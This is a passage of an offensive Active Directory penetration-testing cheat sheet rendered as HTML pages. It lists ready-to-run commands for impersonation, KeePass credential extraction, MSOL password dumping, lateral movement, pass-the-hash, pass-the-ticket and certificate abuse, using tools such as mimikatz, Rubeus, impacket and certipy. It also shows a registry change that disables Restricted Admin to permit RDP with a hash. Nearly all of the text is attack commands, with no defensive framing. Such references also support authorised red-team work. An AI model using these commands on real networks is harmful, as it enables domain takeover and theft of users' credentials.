c:\users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt; </p><p>&gt;&gt;	DPAPImk2john.py --preferred &lt;prefered_file&gt;</p><p>	&gt;&gt;	DPAPImk2john.py -c domain -mk &lt;masterkey&gt; -S &lt;sid&gt;</p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Impersonate_1085.html"></a><h1 class='title level-3'>Impersonate</h1><br/><p># Admin access</p><p>## Impersonate &gt;&gt;&gt; ACL [<a href="#Domain_Dominance--ACLs-ACEs_Permissions_974.html">ACLs/ACEs Permissions</a>] || User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p></p><p>msf&gt; use incognito impersonate_token &lt;domain&gt;\\&lt;user&gt;</p><p></p><p>nxc smb &lt;ip&gt; -u &lt;localAdmin&gt; -p &lt;password&gt; --loggedon-users</p><p>&gt;&gt;	nxc smb &lt;ip&gt; -u &lt;localAdmin&gt; -p &lt;password&gt; -M schtask_as -o USER=&lt;logged-on-user&gt; CMD=&lt;cmd-command&gt;</p><p></p><p>irs.exe list</p><p>&gt;&gt;	irs.exe exec -p &lt;pid&gt; -c &lt;command&gt;</p><p></p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Impersonate--Impersonate_with_adcs_1230.html"></a><h1 class='title level-4'>Impersonate with adcs</h1><br/><p># Admin access</p><p>## Impersonate</p><p>## Impersonate with adcs &gt;&gt;&gt; NTLM [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>] || Pass The Hash / Ticket / Certificate [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p><p></p><p>masky - d &lt;domain&gt; -u &lt;user&gt;  (-p &lt;password&gt; || -k || -H &lt;hash&gt;) -ca &lt;certificate authority&gt; &lt;ip&gt;</p><p></p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Impersonate--Impersonate_with_RDP_Session_1231.html"></a><h1 class='title level-4'>Impersonate with RDP Session</h1><br/><p># Admin access</p><p>## Impersonate</p><p>### Impersonate RDP Session &gt;&gt;&gt; RDP [<a href="#Domain_Dominance--Lateral_Movement--Clear_text_Password--RDP_1238.html">RDP</a>]</p><p></p><p>psexec.exe -s -i cmd</p><p>&gt;&gt;	query user</p><p>    &gt;&gt;	tscon.exe &lt;id&gt; /dest:&lt;session_name&gt;</p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Misc_1086.html"></a><h1 class='title level-3'>Misc</h1><br/><p># Admin access</p><p></p><p>## Misc<ul><li>Find Users &gt;&gt;&gt; Username [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</li></ul></p><p>  - `smbmap.py --host-file ./computers.list -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -r &#39;C$\Users&#39; --dir-only --no-write-check --no-update --no-color --csv users_directory.csv`<ul><li>Extract Keepass &gt;&gt;&gt; User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</li></ul></p><p>  - `KeePwn.py plugin add -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -d &#39;&lt;domain&gt;&#39; -t &lt;target&gt; --plugin KeeFarceRebornPlugin.dll`</p><p>  - `KeePwn.py trigger add -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -d &#39;&lt;domain&gt;&#39; -t &lt;target&gt;`<ul><li>Hybrid (Azure AD-Connect) &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>]</li></ul></p><p>  - Dump cleartext password of MSOL Account on ADConnect Server</p><p>    - `azuread_decrypt_msol_v2.ps1`</p><p>    - `nxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -M msol`</p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Misc--Find_Users_1232.html"></a><h1 class='title level-4'>Find Users</h1><br/><p># Admin access</p><p>## Misc</p><p>### Find Users &gt;&gt;&gt; Username [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</p><p></p><p>smbmap.py --host-file ./computers.list -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -r &#39;C$\Users&#39; --dir-only --no-write-check --no-update --no-color --csv users_directory.csv</p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Misc--Extract_KeePass_1233.html"></a><h1 class='title level-4'>Extract KeePass</h1><br/><p># Admin access</p><p>## Misc</p><p>### Extract Keepass &gt;&gt;&gt; User + Pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p></p><p>KeePwn.py plugin add -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -d &#39;&lt;domain&gt;&#39; -t &lt;target&gt; --plugin KeeFarceRebornPlugin.dll</p><p></p><p>KeePwn.py trigger add -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -d &#39;&lt;domain&gt;&#39; -t &lt;target&gt;</p></div><div class='page'><a name="Domain_Dominance--Admin_Access--Misc--Hybrid_(Azure_AD-Connect)_1234.html"></a><h1 class='title level-4'>Hybrid (Azure AD-Connect)</h1><br/><p># Admin access</p><p>## Misc</p><p>### Hybrid (Azure AD-Connect) &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>]</p><p></p><p>Dump cleartext password of MSOL Account on ADConnect Server</p><p>&gt;&gt;	azuread_decrypt_msol_v2.ps1</p><p>&gt;&gt;	nxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -M msol</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement_979.html"></a><h1 class='title level-2'>Lateral Movement</h1><br/><p><ul><li>PsExec, SMBexec, WMIexec, etc.</li></ul></p><p> • <strong>Intent:</strong> Remote execution using creds.</p><p> • <strong>Purpose:</strong> Achieve SYSTEM/admin on remote.</p><p><ul><li>WinRM / RDP</li></ul></p><p> • <strong>Intent:</strong> Remote interactive access.</p><p> • <strong>Purpose:</strong> Lateral move with creds.</p><p><ul><li><code>smbclient</code>, <code>mssqlclient</code></li></ul></p><p> • <strong>Intent:</strong> Connect to file shares / SQL.</p><p> • <strong>Purpose:</strong> Extract data or pivot.</p><p><ul><li>Pass-the-Hash / Overpass-the-Hash</li></ul></p><p> • <strong>Intent:</strong> Authenticate with hashes.</p><p> • <strong>Purpose:</strong> Move laterally without cleartext creds.</p><p><ul><li>Pass-the-Ticket (kerberos)</li></ul></p><p> • <strong>Intent:</strong> Reuse tickets (kirbi/ccache).</p><p> • <strong>Purpose:</strong> Authenticate as victim.</p><p><ul><li>Socks proxychains (lookupsid, secretsdump, smbclient)</li></ul></p><p> • <strong>Intent:</strong> Route tools through relays.</p><p> • <strong>Purpose:</strong> Pivot into internal systems.</p><p><ul><li>Certificate abuse (certipy auth, gettgtpkinit)</li></ul></p><p> • <strong>Intent:</strong> Use PFX/certs for auth.</p><p> • <strong>Purpose:</strong> Move laterally via PKINIT.</p><p><ul><li>MSSQL abuse (<code>xp_cmdshell</code>, <code>exec_as_user</code>)</li></ul></p><p> • <strong>Intent:</strong> Elevate within SQL.</p><p> • <strong>Purpose:</strong> Execute OS commands or pivot.</p><p></p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Clear_text_Password_1087.html"></a><h1 class='title level-3'>Clear text Password</h1><br/><p># Lateral Move</p><p></p><p>## Clear text Password &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]<ul><li>Interactive-shell - psexec &gt;&gt;&gt; Authority/System [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</li></ul></p><p>  - `psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;`</p><p>  - `psexec.exe -AcceptEULA \\&lt;ip&gt;`</p><p>  - `psexecsvc.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;`<ul><li>Pseudo-shell (file write and read)</li></ul></p><p>  - `atexec.py  &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; &quot;command&quot;`</p><p>  - `smbexec.py  &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;`</p><p>  - `wmiexec.py  &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;`</p><p>  - `dcomexec.py  &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;`</p><p>  - `nxc smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -x &lt;cmd&gt;`<ul><li>WinRM &gt;&gt;&gt; Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</li></ul></p><p>  - `evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt;`</p><p>  - `Enter-PSSession -ComputerName &lt;computer&gt; -Credential &lt;domain&gt;\&lt;user&gt;`</p><p>  - `nxc winrm &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -x &lt;cmd&gt;`<ul><li>RDP &gt;&gt;&gt; Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</li></ul></p><p>  - `xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /p:&lt;password&gt; /v:&lt;ip&gt;`<ul><li>SMB &gt;&gt;&gt; Search files [<a href="#Domain_Dominance--Low_Access_(priv_esc)--Search_files_1032.html">Search files</a>]</li></ul></p><p>  - `smbclient.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;`</p><p>  - `smbclient-ng.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; --host &lt;ip&gt;`<ul><li>MSSQL &gt;&gt;&gt; MSSQL [<a href="#Domain_Dominance--Lateral_Movement--MSSQL_1092.html">MSSQL</a>]</li></ul></p><p>  - `nxc mssql &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt;`</p><p>  - `mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;`</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Clear_text_Password--Interactive-shell_-_psexec_1235.html"></a><h1 class='title level-4'>Interactive-shell - psexec</h1><br/><p># Lateral Move</p><p>## Clear text Password &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>### Interactive-shell - psexec &gt;&gt;&gt; Authority/System [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</p><p></p><p>psexec.exe -AcceptEULA \\&lt;ip&gt;</p><p></p><p>psexecsvc.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Clear_text_Password--Pseudo-shell_(file_write_and_read)_1236.html"></a><h1 class='title level-4'>Pseudo-shell (file write and read)</h1><br/><p># Lateral Move</p><p>## Clear text Password &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>### Pseudo-shell (file write and read)</p><p></p><p>atexec.py  &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; &quot;command&quot;</p><p></p><p>smbexec.py  &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</p><p></p><p>wmiexec.py  &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</p><p></p><p>dcomexec.py  &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</p><p></p><p>nxc smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -x &lt;cmd&gt;</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Clear_text_Password--WinRM_1237.html"></a><h1 class='title level-4'>WinRM</h1><br/><p># Lateral Move</p><p>## Clear text Password &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>### WinRM &gt;&gt;&gt; Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt;</p><p></p><p>Enter-PSSession -ComputerName &lt;computer&gt; -Credential &lt;domain&gt;\&lt;user&gt;</p><p></p><p>nxc winrm &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -x &lt;cmd&gt;</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Clear_text_Password--RDP_1238.html"></a><h1 class='title level-4'>RDP</h1><br/><p># Lateral Move</p><p>## Clear text Password &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>### RDP &gt;&gt;&gt; Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /p:&lt;password&gt; /v:&lt;ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Clear_text_Password--SMB_1239.html"></a><h1 class='title level-4'>SMB</h1><br/><p># Lateral Move</p><p>## Clear text Password &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>### SMB &gt;&gt;&gt; Search files [<a href="#Domain_Dominance--Low_Access_(priv_esc)--Search_files_1032.html">Search files</a>]</p><p></p><p>smbclient.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</p><p></p><p>smbclient-ng.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; --host &lt;ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Clear_text_Password--MSSQL_1240.html"></a><h1 class='title level-4'>MSSQL</h1><br/><p># Lateral Move</p><p>## Clear text Password &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>### MSSQL &gt;&gt;&gt; MSSQL [<a href="#Domain_Dominance--Lateral_Movement--MSSQL_1092.html">MSSQL</a>]</p><p></p><p>nxc mssql &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt;</p><p></p><p>mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--NT_Hash_1088.html"></a><h1 class='title level-3'>NT Hash</h1><br/><p># Lateral Move</p><p></p><p>## NT Hash<ul><li>Pass the Hash</li></ul></p><p>  - MSSQL/PseudoShell PsExec/SMB...  &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>    - `impacket : same as with creds, but use -hashes &#39;:&lt;hash&gt;&#39;`</p><p>    - `nxc : same as with creds, but use -H &#39;:&lt;hash&gt;&#39;`</p><p>  - `mimikatz &quot;privilege::debug sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt;&quot;` &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>  - RDP &gt;&gt;&gt; Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>    - `reg.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -hashes &#39;:&lt;hash&gt;&#39; add -keyName &#39;HKLM\System\CurrentControlSet\Control\Lsa&#39; -v &#39;DisableRestrictedAdmin&#39; -vt &#39;REG_DWORD&#39; -vd &#39;0&#39;`<ul><li>`xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;hash&gt; /v:&lt;ip&gt;`</li></ul></p><p>  - WinRM &gt;&gt;&gt; Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>    - `evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -H &lt;hash&gt;`<ul><li>Overpass the Hash / Pass the key (PTK) &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</li></ul></p><p>  - `Rubeus.exe asktgt /user:victim /rc4:&lt;rc4value&gt;`</p><p>    - `Rubeus.exe ptt /ticket:&lt;ticket&gt;`</p><p>    - `Rubeus.exe createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]`</p><p>  - `getTGT.py &lt;domain&gt;/&lt;user&gt; -hashes :&lt;hashes&gt;`</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html"></a><h1 class='title level-4'>Pass the Hash</h1><br/><p># Lateral Move</p><p>## NT Hash</p><p>### Pass the Hash &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>mimikatz &quot;privilege::debug sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt;&quot;` &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash--MSSQL-PseudoShell_PsExec-SMB..._1243.html"></a><h1 class='title level-5'>MSSQL/PseudoShell PsExec/SMB...</h1><br/><p># Lateral Move</p><p>## NT Hash</p><p>### Pass the Hash</p><p>#### MSSQL/PseudoShell PsExec/SMB...  &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>impacket : same as with creds, but use -hashes &#39;:&lt;hash&gt;&#39;</p><p></p><p>nxc : same as with creds, but use -H &#39;:&lt;hash&gt;&#39;</p><p></p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash--RDP_1244.html"></a><h1 class='title level-5'>RDP</h1><br/><p># Lateral Move</p><p>## NT Hash</p><p>### Pass the Hash</p><p>#### RDP &gt;&gt;&gt; Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>reg.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -hashes &#39;:&lt;hash&gt;&#39; add -keyName &#39;HKLM\System\CurrentControlSet\Control\Lsa&#39; -v &#39;DisableRestrictedAdmin&#39; -vt &#39;REG_DWORD&#39; -vd &#39;0&#39;</p><p></p><p>xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;hash&gt; /v:&lt;ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash--WinRM_1246.html"></a><h1 class='title level-5'>WinRM</h1><br/><p># Lateral Move</p><p>## NT Hash</p><p>### Pass the Hash</p><p>#### WinRM &gt;&gt;&gt; Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -H &lt;hash&gt;</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--NT_Hash--Overpass_the_Hash_-_Pass_the_key_(PTK)_1242.html"></a><h1 class='title level-4'>Overpass the Hash / Pass the key (PTK)</h1><br/><p># Lateral Move</p><p>## NT Hash</p><p>### Overpass the Hash / Pass the key (PTK) &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>getTGT.py &lt;domain&gt;/&lt;user&gt; -hashes :&lt;hashes&gt;</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--NT_Hash--Overpass_the_Hash_-_Pass_the_key_(PTK)--Rubeus_1247.html"></a><h1 class='title level-5'>Rubeus</h1><br/><p># Lateral Move</p><p>## NT Hash</p><p>### Overpass the Hash / Pass the key (PTK) &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>#### Rubeus</p><p></p><p>Rubeus.exe asktgt /user:victim /rc4:&lt;rc4value&gt;</p><p>&gt;&gt;	Rubeus.exe ptt /ticket:&lt;ticket&gt;</p><p>&gt;&gt;	Rubeus.exe createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Kerberos_1089.html"></a><h1 class='title level-3'>Kerberos</h1><br/><p># Lateral Move</p><p></p><p>## Kerberos<ul><li>Pass the Ticket (ccache / kirbi)</li></ul></p><p>  - Convert Format</p><p>    - `ticketConverter.py &lt;kirbi||ccache&gt; &lt;ccache||kirbi&gt;`</p><p>  - `export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache` &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>    - `impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket`</p><p>  - `mimikatz kerberos::ptc &quot;&lt;ticket&gt;&quot;`</p><p>  - `Rubeus.exe ptt /ticket:&lt;ticket&gt;`</p><p>  - `proxychains secretsdump.py -k&#39;&lt;domain&gt;&#39;/&#39;&lt;user&gt;&#39;@&#39;&lt;ip&gt;&#39;`</p><p>  - Modify SPN &gt;&gt;&gt; PassTheTicket</p><p>    - `tgssub.py -in &lt;ticket.ccache&gt; -out &lt;newticket.ccache&gt; -altservice &quot;&lt;service&gt;/&lt;target&gt;&quot; #pr 1256`</p><p><ul><li>Aeskey &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</li></ul></p><p>  - `impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)`</p><p>  - `proxychains secretsdump.py -aesKey &lt;key&gt; &#39;&lt;domain&gt;&#39;/&#39;&lt;user&gt;&#39;@&#39;&lt;ip&gt;&#39;`</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html"></a><h1 class='title level-4'>Pass the Ticket (ccache / kirbi)</h1><br/><p># Lateral Move</p><p>## Kerberos</p><p>### Pass the Ticket (ccache / kirbi)</p><p></p><p>Convert Format</p><p>&gt;&gt;	ticketConverter.py &lt;kirbi||ccache&gt; &lt;ccache||kirbi&gt;</p><p></p><p>export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>&gt;&gt;	impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket</p><p></p><p>mimikatz kerberos::ptc &quot;&lt;ticket&gt;&quot;</p><p></p><p>Rubeus.exe ptt /ticket:&lt;ticket&gt;</p><p></p><p>proxychains secretsdump.py -k&#39;&lt;domain&gt;&#39;/&#39;&lt;user&gt;&#39;@&#39;&lt;ip&gt;</p><p></p><p>Modify SPN &gt;&gt;&gt; PassTheTicket</p><p>&gt;&gt;	tgssub.py -in &lt;ticket.ccache&gt; -out &lt;newticket.ccache&gt; -altservice &quot;&lt;service&gt;/&lt;target&gt;&quot; #pr 1256</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Kerberos--Aeskey_1249.html"></a><h1 class='title level-4'>Aeskey</h1><br/><p># Lateral Move</p><p>## Kerberos</p><p>### Aeskey &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)</p><p></p><p>proxychains secretsdump.py -aesKey &lt;key&gt; &#39;&lt;domain&gt;&#39;/&#39;&lt;user&gt;&#39;@&#39;&lt;ip&gt;&#39;</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Socks_(relay)_1090.html"></a><h1 class='title level-3'>Socks (relay)</h1><br/><p># Lateral Move</p><p>## Socks (relay)</p><p></p><p>proxychains lookupsid.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -no-pass -domain-sids</p><p></p><p>proxychains mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -no-pass &gt;&gt;&gt; MSSQL [<a href="#Domain_Dominance--Lateral_Movement--MSSQL_1092.html">MSSQL</a>]</p><p></p><p>proxychains secretsdump.py -no-pass &#39;&lt;domain&gt;&#39;/&#39;&lt;user&gt;&#39;@&#39;&lt;ip&gt;&#39; &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>]</p><p></p><p>proxychains smbclient.py -no-pass &lt;user&gt;@&lt;ip&gt; &gt;&gt;&gt; Search files [<a href="#Domain_Dominance--Low_Access_(priv_esc)--Search_files_1032.html">Search files</a>]</p><p></p><p>proxychains atexec.py  -no-pass  &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; &quot;command&quot; &gt;&gt;&gt; Authority/System [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>proxychains smbexec.py  -no-pass  &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; &gt;&gt;&gt; Authority/System [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Certificate_(pfx)_1091.html"></a><h1 class='title level-3'>Certificate (pfx)</h1><br/><p># Lateral Move</p><p></p><p>## Certificate (pfx)<ul><li>unpac the hash</li></ul></p><p>  - `certipy auth -pfx &lt;crt_file&gt; -dc-ip &lt;dc_ip&gt;`</p><p>  - `gettgtpkinit.py -cert-pfx &lt;crt.pfx&gt; -pfx-pass &lt;crt_pass&gt; &quot;&lt;domain&gt;/&lt;dc_name&gt;&quot; &lt;tgt.ccache&gt;`</p><p>    - `getnthash.py -key &#39;&lt;AS-REP encryption key&gt;&#39; &#39;&lt;domain&gt;&#39;/&#39;&lt;dc_name&gt;&#39;`<ul><li>Pass the certificate</li></ul></p><p>  - pkinit</p><p>    - `gettgtpkinit.py -cert-pfx &quot;&lt;pfx_file&gt;&quot; ^[-pfx-pass  &quot;&lt;cert-password&gt;&quot;] &quot;&lt;fqdn_domain&gt;/&lt;user&gt;&quot; &quot;&lt;tgt_ccache_file&gt;&quot;`</p><p>    - `Rubeus.exe asktgt /user:&quot;&lt;username&gt;&quot; /certificate:&quot;&lt;pfx_file&gt;&quot; [/password:&quot;&lt;certificate_password&gt;&quot;] /domain:&quot;&lt;fqdn-domain&gt;&quot; /dc:&quot;&lt;dc&gt;&quot; /show`</p><p>    - `certipy auth -pfx &lt;crt_file&gt; -dc-ip &lt;dc_ip&gt;`</p><p>  - schannel</p><p>    - `certipy auth -pfx &lt;pfx_file&gt; -ldap-shell`<ul><li>add_computer</li></ul></p><p>        - Set RBCD &gt;&gt;&gt; RBCD [<a href="#Domain_Dominance--Kerberos_Delegation--Resource-Based_Constrained_Delegation_1058.html">Resource-Based Constrained Delegation</a>]</p><p>    - `certipy cert -pfx &quot;&lt;pfx_file&gt;&quot; -nokey -out &quot;user.crt&quot;`<ul><li>`certipy cert -pfx &quot;&lt;pfx_file&gt;&quot; -nocert -out &quot;user.key&quot;`</li></ul></p><p>        - `passthecert.py -action ldap-shell -crt &lt;user.crt&gt; -key &lt;user.key&gt; -domain &lt;domain&gt; -dc-ip &lt;dc_ip&gt;`</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Unpack_the_hash_1250.html"></a><h1 class='title level-4'>Unpack the hash</h1><br/><p># Lateral Move</p><p>## Certificate (pfx)</p><p>### Unpack the hash</p><p></p><p>certipy auth -pfx &lt;crt_file&gt; -dc-ip &lt;dc_ip&gt;</p><p></p><p>gettgtpkinit.py -cert-pfx &lt;crt.pfx&gt; -pfx-pass &lt;crt_pass&gt; &quot;&lt;domain&gt;/&lt;dc_name&gt;&quot; &lt;tgt.ccache&gt;</p><p>&gt;&gt;	getnthash.py -key &#39;&lt;AS-REP encryption key&gt;&#39; &#39;&lt;domain&gt;&#39;/&#39;&lt;dc_name&gt;&#39;</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html"></a><h1 class='title level-4'>Pass the certificate</h1><br/><p># Lateral Move</p><p>## Certificate (pfx)</p><p>### Pass the certificate</p><p>  - pkinit</p><p>    - `gettgtpkinit.py -cert-pfx &quot;&lt;pfx_file&gt;&quot; ^[-pfx-pass  &quot;&lt;cert-password&gt;&quot;] &quot;&lt;fqdn_domain&gt;/&lt;user&gt;&quot; &quot;&lt;tgt_ccache_file&gt;&quot;`</p><p>    - `Rubeus.exe asktgt 